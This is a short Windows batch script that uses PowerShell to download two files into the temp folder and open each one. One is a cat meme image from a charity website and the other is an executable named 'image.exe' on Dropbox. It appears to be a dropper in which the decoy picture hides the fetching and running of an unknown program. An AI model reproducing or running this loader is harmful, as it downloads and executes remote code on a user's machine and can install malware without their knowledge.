@echo off

set files="https://www.cats.org.uk/media/6099/laptop-cat-meme-400px.jpg?width=400&height=306" "https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe?rlkey=z0xqqilboj5m9xbskio0xio2e&st=tj3b5ej3&dl=0"

powershell.exe -Command "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
